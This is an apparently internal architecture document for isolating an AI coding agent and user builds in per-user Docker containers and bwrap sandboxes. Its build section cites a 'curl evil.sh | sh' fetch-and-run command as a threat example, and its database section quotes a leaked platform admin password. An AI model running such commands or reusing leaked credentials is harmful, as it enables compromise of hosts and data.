# Container Isolation Architecture (v1)

> **Status:** Phase 0 — approved design, no code changes yet.
> **Companion:** [container_migration_phase0.md](./container_migration_phase0.md) — dependency graph, risk report, test plans.

This document is the authoritative reference for the Docker per-user workspace
isolation project. Every later phase must conform to what's described here.

---

## 1. Objective

Move all untrusted code execution (Claude Code, npm, pip, builds) off the worker
host and into per-user Docker containers, while preserving every existing
DreamAgent feature.

The worker host must never execute customer-influenced code. Platform services
(FastAPI, PM2, nginx, postgres) stay on the host; user-generated code runs only
inside that user's container.

---

## 2. Hard rules

1. **Never break a working feature.** Prime directive — outranks everything.
2. Small incremental changes. No system rewrite.
3. Every capability gated by feature flag `EXECUTION_MODE=local|container`.
4. Approval gate after every phase. Stop on any regression.
5. Touch only what the current phase requires.

---

## 3. Scope

### In scope (v1)

- Claude AI edit → runs inside container via `docker exec`
- Build (npm install, npm run build, pip install) → inside container
- Workspace files → bind-mounted from host into container
- Per-user container lifecycle (lazy create, on-demand start, idle-stop)
- Resource limits (memory, CPU, pids)
- Cheap hardening (`--cap-drop=ALL`, `--security-opt=no-new-privileges`,
  `--read-only`, `--tmpfs /tmp`, no Docker socket, no backend mount)

### Out of scope (DEFERRED — do not build in v1)

| Item | Why deferred | Upgrade trigger |
|---|---|---|
| Dynamic backend preview (FastAPI/Express live) | Separate `RuntimeContainer` project | When live backend preview becomes a product requirement |
| ~~Scheduler user-code isolation~~ | ✅ **DONE** — see §14 (bwrap sandbox per job) | — |
| userns-remap, custom seccomp, AppArmor | Adds ops complexity disproportionate to current threat model | When paying customers exist OR real escape attempt detected |
| gVisor / Kata / Firecracker | Drop-in via ContainerManager abstraction; premature at current scale | When noisy-neighbor or escape risk warrants |
| Disk quotas | No noisy-neighbor problem yet | When a user fills the disk |
| Egress rate limits | No exfiltration signal yet | When external DDoS or exfil detected |
| Build queue / fairness | No contention yet | When concurrent builds thrash the worker |
| Multi-worker clustering | Single worker handles hundreds of registered users at realistic load | When single worker saturates (~1000+ active users) |
| DB networking changes (`localhost` → bridge IP) | Only needed when backends run inside containers — v1 backends stay on host PM2 | Folded into future in-container-backend phase |

---

## 4. Architecture

```
Host (worker VPS)
├── clawd-backend (FastAPI, runs as root)        ← never containerized
├── session_chat_worker.py                        ← never containerized
├── project_creation_worker.py                    ← never containerized
├── PM2 + nginx                                   ← still serves static dist
├── dreampilot-postgres (Docker container)        ← unchanged
├── /workspaces/user_<id>/                        ← persistent bind-mount root
│   └── website/<id>_<slug>_<ts>/                 ← project files (1001:1001)
├── /srv/cache/                                   ← shared npm+pip cache (ro in containers)
└── Docker daemon
    ├── dreamagent-net (bridge network)
    ├── dreamagent-user-1                         ← per-user workspace container
    ├── dreamagent-user-2
    └── idle_reaper (PM2 process, 60s loop)
```

### Why per-user container (not per-project / per-session)

This is the converged pattern across Replit, Gitpod, Daytona, and Fly.io for
persistent-workspace platforms:

- **Per-project** loses shared deps and Claude session continuity across a user's projects.
- **Per-session** pays cold-start latency per edit and loses in-process state.
- **Per-user** with bind-mount is the only pattern that gives persistent state, fast resume (~1s), and simple lifecycle.

The idle reaper is what makes per-user viable on limited RAM. Without it, an 8 GB
worker caps at ~4 concurrent users. With a 15-min idle stop, the same worker
serves ~150–300 registered users at realistic ~10–15% peak concurrency.

### Capacity estimate (revised, pragmatic)

| Worker RAM | Concurrent active editors | Simultaneous online | Registered users (10–15% peak online) |
|---|---:|---:|---:|
| 8 GB | 3–4 | 15–25 | 150–300 |
| 16 GB | 6–8 | 30–50 | 300–600 |
| 32 GB | 12–16 | 60–100 | 600–1,500 |

The right capacity metric is **concurrent active execution**, not registered user
count. Monitor that, not signups.

---

## 5. Container contract

```
image:        dreamagent/user-workspace:latest (single, reusable)
mounts:       /workspaces/user_<id> → /workspace (rw)
              /srv/cache            → /cache    (ro, shared npm/pip cache)
user:         uid 1001, gid 1001, no sudo
flags:        --cap-drop=ALL
              --security-opt=no-new-privileges
              --read-only
              --tmpfs /tmp
              --memory=2g --cpus=2 --pids-limit=256
              --network=dreamagent-net
              --restart unless-stopped
              (no Docker socket, ever)
```

### Resource limits are non-optional

`--memory`, `--cpus`, `--pids-limit`, `--cap-drop=ALL`, `--security-opt=no-new-privileges`,
`--read-only`, `--tmpfs /tmp` ship on the **first** `docker run` (Phase 3). Never
run a container without them, even during development. They cost zero complexity
and meaningfully reduce blast radius.

### What the container cannot see

- Host root filesystem (`/`, `/root`, `/etc`, `/home`)
- Backend source (`/root/clawd-backend`)
- Other users' workspaces (`/workspaces/user_<other>`)
- Docker socket (`/var/run/docker.sock`)
- nginx, PM2, postgres configuration
- Platform env vars (DB creds, API keys)

### What the container CAN see

- Its own `/workspace/` (bind-mount, rw) — the user's projects
- `/cache/` (ro) — shared npm/pip cache for fast installs
- `/tmp/` (tmpfs, ephemeral, rw) — scratch space for builds

---

## 6. Storage abstraction

```python
class ContainerStorage:
    """Interface only — implementation can swap without touching DreamAgent code."""
    def host_path(self, user_id: int, project_path: str) -> str:
        """Path on host filesystem. Used by host nginx to serve dist/."""
    def container_path(self, user_id: int, project_path: str) -> str:
        """Path inside container. Used for docker exec cwd."""
```

### v1 implementation: bind-mount

- Host: `/workspaces/user_<id>/{type_folder}/{id}_{slug}_{ts}/`
- Container: `/workspace/{type_folder}/{id}_{slug}_{ts}/`
- Why bind-mount: host nginx can serve `dist/` directly (zero new networking for preview), standard backup tools work, UID/GID alignment is trivial on Linux-to-Linux.

### Future swap (do not implement now)

- Named Docker volumes — cleaner ownership, matches Gitpod/Codespaces pattern. Becomes preferable when preview moves into containers (future RuntimeContainer phase).
- NFS — multi-worker support. Triggers at ~1000 users or when adding a second worker.

The abstraction makes the swap a one-class change; DreamAgent code that calls
`ContainerStorage.host_path()` doesn't change.

---

## 7. ProjectRuntimeManager + ContainerManager

Two-layer abstraction. Keeps DreamAgent code agnostic of where execution happens.

```
DreamAgent code
      │
      ▼
ProjectRuntimeManager.exec(cmd, cwd, env)
      │
      ├── EXECUTION_MODE=local      → subprocess.run/Popen (today's behavior)
      └── EXECUTION_MODE=container  → ContainerManager(user_id).exec(...)
                                          │
                                          ▼
                                      docker exec -u 1001:1001 -w <path> dreamagent-user-<id> <cmd>
```

### ContainerManager API

```python
class ContainerManager:
    def __init__(self, user_id: int): ...
    def ensure_workspace(self) -> Path              # mkdir /workspaces/user_<id>/, chown 1001:1001
    def ensure_container(self) -> str               # create if missing, start if stopped, return name
    def start(self) -> None
    def stop(self) -> None
    def restart(self) -> None
    def is_running(self) -> bool
    def health(self) -> dict                        # CPU/mem/uptime via docker inspect
    def exec(self, cmd, cwd=None, env=None, timeout=None) -> CompletedProcess
    async def exec_stream(self, cmd, cwd, env) -> AsyncIterator[bytes]   # for Claude streaming
    def translate_host_path(self, host_path: str) -> str  # /workspaces/user_X/p → /workspace/p

    @classmethod
    def cleanup_idle(cls) -> int                    # stop containers idle > IDLE_TIMEOUT
    @classmethod
    def get_status_all(cls) -> list[dict]           # for monitoring dashboard
```

All Docker interaction via `subprocess.run(["docker", ...])`. No Docker SDK —
matches existing codebase style, smaller attack surface.

### Why two layers

- `ProjectRuntimeManager` answers: "where does this command run?" (local vs container)
- `ContainerManager` answers: "how do I talk to this user's container?"

When gVisor or Firecracker gets added later, only `ContainerManager` changes
internally. `ProjectRuntimeManager` and everything above stays untouched.

---

## 8. Lifecycle

| Event | Action | Why |
|---|---|---|
| User's first action (create project or first edit) | `ensure_workspace()` mkdir `/workspaces/user_<id>/` chown 1001:1001 | Lazy — don't pay for signups who never use it |
| First execution for the user | `ensure_container()` → `docker run` if not exists, else `docker start` if stopped | On-demand, not at signup |
| Each subsequent execution | Bump `last_used_at`, `docker exec` into running container | O(1) — no lifecycle cost |
| Idle > 15 min (reaper, 60s loop) | `docker stop` (NOT rm) | Stops consuming RAM; state preserved on disk for fast resume |
| User returns after idle | `docker start` (~1–2s) + `docker exec` | Transparent to user |
| User deleted | `docker rm -f` + `rm -rf /workspaces/user_<id>/` | Cleanup |
| Worker reboot | `--restart unless-stopped` auto-starts; reaper stops idle ones within 60s | No manual recovery |
| Container wedged / health fail | `docker restart` (preserves volume) | Self-heal without losing files |

**What we don't do:** destroy on idle (loses Claude session context), ephemeral
per request (latency), keep alive forever (RAM).

### DB table

```sql
CREATE TABLE IF NOT EXISTS user_containers (
    user_id INTEGER PRIMARY KEY REFERENCES users(id) ON DELETE CASCADE,
    container_name TEXT NOT NULL,
    workspace_path TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_used_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    status TEXT DEFAULT 'created'  -- created | running | stopped | errored
);
```

The reaper scans this table; `last_used_at` is bumped on every `ensure_container` call.

---

## 9. Preview (v1 decision: host serves static, container builds)

**Decision (LOCKED):** Container builds `dist/`; host nginx serves it.

```
Container:                              Host:
npm run build                           nginx serves /workspaces/user_X/.../frontend/dist
  → /workspace/.../frontend/dist/         on {project}.dreamagent.cloud
  (writes to bind-mounted disk)
```

### Why

- Build isolation: `npm install` of malicious package can't touch host
- Serving simplicity: nginx + static files = zero new networking
- Bind mount means `dist/` written by container is immediately visible to host nginx
- No port mapping from container to host (the hardest part of in-container preview)
- Matches Gitpod's "edit in container, serve via proxy" pattern

### What v1 does NOT support

Live preview of FastAPI / Express / Next.js-SSR backends. Users can build them
in the container and download/deploy elsewhere, but they won't get a live
`{project}-api.dreamagent.cloud` preview URL in v1.

This matches Bolt.new and Lovable, neither of which runs user backends in preview.

### Why not "preview in container" (the rejected B2 pattern)

Replit deprecated this exact pattern in 2024: *"extremely dangerous to let the
Agent work against the production environment."* Coupling preview uptime to
container uptime breaks the idle reaper and adds networking complexity for no
benefit at DreamAgent's scale.

When live backend preview becomes a product requirement, introduce a dedicated
**RuntimeContainer** architecture (separate container per running project,
sharing the workspace volume). Do not extend the workspace container.

---

## 10. Build architecture

**Decision:** Builds run inside the container. No exceptions.

`npm install` / `pip install` execute arbitrary post-install scripts from
packages. A malicious package can `curl evil.sh | sh` during install. On host,
that compromises every user's projects. In container, it compromises only the
user's own (already-trusted-as-theirs) workspace.

### Performance

- Shared `/srv/cache` (npm + pip caches) mounted ro into every container
- First user pays the registry cost; subsequent users reuse → 10x faster installs
- Build timeout via `timeout(1)` wrapper (default 900s) prevents runaway builds

---

## 11. AI execution architecture

**Decision:** Claude runs inside the container. Non-negotiable.

Claude runs with `--dangerously-skip-permissions` — it can write any file, run any
command. Today it runs as host user `dreampilot` with `NOPASSWD:ALL` sudoers.
A prompt injection or malicious project file could exfiltrate
`/root/clawd-backend/.env.postgres` (DB creds), other users' `.env`, API keys.

In container, Claude can only touch `/workspace` — its blast radius = one user's files.

### Compatibility

Claude CLI works identically inside Docker (it's just a Node process). Streaming
JSON output passes through `docker exec` stdout unchanged. The only code change
in `claude_code_agent.py` is swapping `sudo -u dreampilot claude` for
`docker exec -u 1001 dreamagent-user-X claude`.

### Edit timeout

Wrap Claude execution in `timeout(1)` (default 600s) to prevent infinite loops
from holding container CPU indefinitely.

---

## 12. Database integration (v1: unchanged)

Per-project DBs already live in the shared `dreampilot-postgres` container with
per-project PG roles + passwords (`DatabaseProvisioner.create_database_and_user`,
`infrastructure_manager.py:300`). This isolation is correct and stays.

In v1, deployed project backends still run on **host PM2** (preview is static
only). Therefore `DATABASE_URL=...@localhost:5432/...` still works — no
networking change needed.

When backends eventually move into containers (future RuntimeContainer phase),
`POSTGRES_HOST` changes from `localhost` to the Docker bridge gateway IP
(`172.17.0.1` or `host.docker.internal`) + a firewall rule. That change belongs
to that future phase, not v1.

---

## 13. Hardening included in v1 (Phase 3)

These ship with the first container — non-optional:

| Control | Implementation | Cost |
|---|---|---|
| Drop all capabilities | `--cap-drop=ALL` | 1 flag |
| Prevent privilege escalation | `--security-opt=no-new-privileges` | 1 flag |
| Read-only rootfs | `--read-only` | 1 flag |
| Writable scratch | `--tmpfs /tmp` | 1 flag |
| Memory cap | `--memory=2g` | 1 flag |
| CPU cap | `--cpus=2` | 1 flag |
| Process cap | `--pids-limit=256` | 1 flag |
| No Docker socket | (just don't mount it) | 0 |
| No backend source mount | (only mount `/workspaces/user_<id>`) | 0 |
| Docker log rotation | `/etc/docker/daemon.json` `json-file` 10m×3 | 1 config |
| Build/edit wall-clock cap | `timeout(1)` wrapper | trivial |

---

## 14. Failure modes

| Failure | Handled by | Notes |
|---|---|---|
| Docker daemon restart | `--restart unless-stopped` on containers | Auto-restart |
| VPS reboot | PM2 resurrect + `--restart` policy | Containers come back; reaper stops idle within 60s |
| Container crash | `--restart` policy | Auto-restart preserves volume |
| OOM (container) | `--memory` limit + OOM killer | Container dies, not the host |
| OOM (host) | Idle reaper | Only if reaper is running |
| Infinite loop in user code | `--cpus` + `timeout(1)` wrapper | Capped per-job |
| Runaway build | `timeout(1)` on build (900s default) | Killed |
| Zombie containers | Reaper + `docker ps` audit | Reaper stops idle; admin can `docker rm` |
| Disk full | **NOT HANDLED in v1** | Documented risk; triggers disk-quota work |
| Network exhaustion | **NOT HANDLED in v1** | Documented risk; triggers egress-limit work |

---

## 15. Monitoring

Extend the existing `/admin/system-metrics` endpoint (`services/system_metrics.py`)
with per-container stats via `docker stats --no-stream --format`. Surface in the
monitoring dashboard you already built.

Track:
- Per-container CPU/RAM (live)
- Container count (running vs stopped)
- Reaper activity (stops per hour)
- Container restart frequency (high = unhealthy)

---

## 16. Upgrade triggers (document, don't implement)

| Trigger | Action |
|---|---|
| Paying customers OR real escape attempt | Add `userns-remap` to `daemon.json`; evaluate gVisor |
| ~1000 active users OR second worker | Swap bind-mount → NFS; add worker pool with user-affinity hashing |
| Density requires hardware isolation | Swap Docker → Firecracker via ContainerManager abstraction |
| A user fills the disk | Add XFS project quotas on `/workspaces` |
| External DDoS / exfil from a container | Add egress rate limits + custom network namespace |
| Concurrent builds thrash the worker | Add build queue with fairness scheduling |

---

## 17. Acceptance criteria (v1)

- ✅ New projects (when `EXECUTION_MODE=container`) stored only under `/workspaces/user_<id>/`
- ✅ One persistent Docker container per user, created lazily, started on demand
- ✅ Claude runs only inside container (when mode=container)
- ✅ npm/pip/build run only inside container (when mode=container)
- ✅ Host backend never executes customer code (when mode=container)
- ✅ PM2 + nginx continue serving static `dist/` unchanged
- ✅ `EXECUTION_MODE=local` preserves today's exact behavior (rollback path)
- ✅ Idle reaper stops containers idle > 15 min
- ✅ All Phase 3 hardening flags present on every `docker run`
- ✅ All 6 smoke tests pass + manual regression checklist passes after every phase

---

## References

- [container_migration_phase0.md](./container_migration_phase0.md) — Phase 0 analysis
- [worker_vps_setup.md](./worker_vps_setup.md) — current worker architecture
- [worker_file_proxy.md](./worker_file_proxy.md) — main → worker proxy (unaffected by this work)
- [worker_scaling.md](./worker_scaling.md) — capacity model this work extends
- [scheduler.md](./scheduler.md) — scheduler service (sandbox + scraping API)

---

## §14 Scheduler Executor Isolation (bwrap sandbox)

**Status**: ✅ Deployed

Each `execute_task(job)` call runs in a fresh bwrap subprocess instead of in-process via importlib. This was the largest privilege-escalation surface in the platform — Claude-generated executor code had full access to `DATABASE_URL`, `/root`, and the host PID table.

### Architecture

```
clawd-scheduler daemon (worker VPS)
  → polls scheduler_jobs (main DB)
  → for each due job:
    subprocess.run([scheduler-sandbox.sh, venv, project_path],
                   input=job_json, timeout=120, env=minimal_env)
      → bwrap (mount namespace + PID namespace isolation)
        → scheduler_runner.py
          → import executor.py
          → executor.execute_task(job)
          → print JSON result
      ← bwrap exits
  → parse result → update_job_run → log_job
```

### Security guarantees

| Resource | Before (importlib) | After (bwrap sandbox) |
|---|---|---|
| `DATABASE_URL` | ✅ readable via `os.environ` | ❌ blocked (whitelisted env) |
| `/root/clawd-backend/.env` | ✅ readable | ❌ not mounted |
| `/workspaces` (other users) | ✅ readable | ❌ not mounted |
| Host PID table | ✅ enumerable via `/proc` | ❌ `--unshare-pid` |
| `pm2 list` | ✅ executable | ❌ pm2 not in sandbox |
| Crash isolation | ❌ executor crash kills scheduler | ✅ only subprocess dies |
| Cross-project env bleed | ✅ shared `os.environ` | ❌ fresh env per job |

### Per-job env whitelist

```python
_SCHEDULER_ENV_KEYS = {
    'PROJECT_ID', 'PROJECT_PATH', 'BACKEND_URL',
    'TELEGRAM_BOT_TOKEN', 'TELEGRAM_CHAT_ID',
    'DISCORD_WEBHOOK_URL',
    'SMTP_HOST', 'SMTP_PORT', 'SMTP_USER', 'SMTP_PASS', 'SMTP_FROM', 'EMAIL_TO',
    'API_ENDPOINT',
    'PATH', 'HOME', 'LANG', 'LC_ALL',
}
```

The project's own `.env` (loaded by `config.py` via `load_dotenv`) is the source of truth for channel-specific keys. `DATABASE_URL` never enters the sandbox.

### Files

| File | Purpose |
|---|---|
| `scripts/scheduler-sandbox.sh` | bwrap wrapper — same mount conventions as `bot-sandbox.sh` |
| `scripts/scheduler_runner.py` | Runs inside sandbox — stdin JSON → execute_task → stdout JSON |
| `services/scheduler/execution_engine.py` | `execute_job()` → `subprocess.run(timeout=120)`, fallback to importlib in local dev |
| `services/scheduler/scheduler.py` | Daemon — ThreadPoolExecutor, `FUTURE_WAIT_TIMEOUT = JOB_TIMEOUT_SECONDS + 30` |

---

## §15 Per-Project Database Isolation

**Status**: ✅ Deployed

Each Telegram/Discord bot gets its own isolated PostgreSQL database + user. Previously, the durable pipeline passed the **platform** DB URL (`admin:StrongAdminPass123@host/dreampilot`) into every bot's `.env`, leaking platform credentials to Claude Code inside Docker containers.

### Architecture

```
project_creation_runs.py
  → _provision_project_database(project_name, project_id)
    → CREATE DATABASE "proj{id}_{name}_db"     ← separate database (empty)
    → CREATE USER "proj{id}_{name}_u"           ← separate user (random 32-char password)
    → GRANT ALL only on proj{id}_{name}_db      ← zero access to dreampilot
  → database_url = postgresql://proj{id}_u:random@host/proj{id}_db
  → passed to bot env_injector → written into .env
```

### Security guarantees

| Resource | Before (platform DB) | After (per-project DB) |
|---|---|---|
| Platform `users` table | ✅ readable | ❌ not accessible |
| Platform `billing_*` tables | ✅ readable | ❌ not accessible |
| `scheduler_jobs` table | ✅ readable/writable | ❌ not accessible |
| Other bots' data | ✅ readable (shared DB) | ❌ isolated database |
| Bot's own `users` table | ✅ | ✅ (in its own DB) |

The per-project user has **zero grants** on the `dreampilot` database. Postgres denies by default — no explicit `REVOKE` needed.

### Files

| File | Purpose |
|---|---|
| `services/project_creation_runs.py` | `_provision_project_database()` — uses psycopg2 over TCP (works from worker VPS) |
| `services/telegram/env_injector.py` | Writes `DATABASE_URL` into bot `.env` from provisioning result |
| `services/discord/env_injector.py` | Same |

---

## §16 Container Reaper — PID-based Active Detection

**Status**: ✅ Deployed

The container reaper uses a PID file (`/tmp/.claude_active_pid` inside the container) to detect active Claude sessions, instead of fragile `pgrep` pattern matching.

### How it works

```
Chat starts → ClaudeCodeAgent.query()
  → mark_claude_active(process.pid)
    → writes PID to /tmp/.claude_active_pid inside container

Reaper checks (every 60s):
  has_active_claude()
    Layer 1: read /tmp/.claude_active_pid → kill -0 PID → alive? → skip container
    Layer 2: /proc scan fallback (safety net)

Chat ends → finally block
  → mark_claude_inactive()
    → rm /tmp/.claude_active_pid

Reaper checks:
  has_active_claude() → file not found → return False → stop container
```

### Files

| File | Purpose |
|---|---|
| `services/container_manager.py` | `has_active_claude()`, `mark_claude_active()`, `mark_claude_inactive()` |
| `claude_code_agent.py` | Calls `mark_claude_active(pid)` after spawn, `mark_claude_inactive()` in finally |
| `scripts/container_reaper.py` | PM2 loop calling `ContainerManager.cleanup_idle()` |

---

## §17 Web Scraping API

**Status**: ✅ Deployed

Server-side Chrome DevTools scraping API at `POST /internal/scrape`. Runs on the main VPS where Chrome Headless Shell is installed. Callers (bwrap sandboxes, Docker containers) reach it via `BACKEND_URL/internal/scrape` — no local Chrome needed.

### Tiered approach

| Tier | Method | Speed | RAM | Use case |
|---|---|---|---|---|
| 1. JSON API | `api_client.get_crypto_price()` etc. | ~200ms | 0MB | Public APIs (CoinGecko, weather) |
| 2. Fast HTML | `api_client.fetch_page(url, extract_js)` | ~200ms | ~5MB | Static pages (news, products) |
| 3. Chrome CDP | `web_scraper.scrape_url(ScrapeConfig(scroll=True))` | ~2-5s | ~50MB/tab | JS-rendered SPAs, scroll |

**`render=false`** (default): `httpx` fetches HTML → BeautifulSoup parses → CSS selectors applied.
**`render=true`**: Chrome Headless Shell renders via CDP websocket. Each request opens a fresh tab (concurrent-safe, max 10).

### Files

| File | Purpose |
|---|---|
| `services/cdp_scraper.py` | Async CDP-over-websocket client |
| `app.py POST /internal/scrape` | Endpoint — IP-guarded, branches on `render` flag |
| `templates/*/services/api_client.py` | `fetch_page()` — fast HTML mode |
| `templates/*/services/web_scraper.py` | `scrape_url()` — auto-selects render mode |

### Chrome installation (main VPS)

```bash
# Chrome Headless Shell (lightweight, ~50MB, no GUI code)
cd /tmp
JSON=$(curl -s https://googlechromelabs.github.io/chrome-for-testing/last-known-good-versions-with-downloads.json)
URL=$(echo "$JSON" | python3 -c "import sys,json; d=json.load(sys.stdin); [print(x['url']) for x in d['channels']['Stable']['downloads']['chrome-headless-shell'] if 'linux' in x.get('platform','')]")
wget -q "$URL" -O chromium.zip
unzip -q chromium.zip -d /opt/
ln -sf /opt/chrome-headless-shell-linux64/chrome-headless-shell /usr/bin/chromium
```
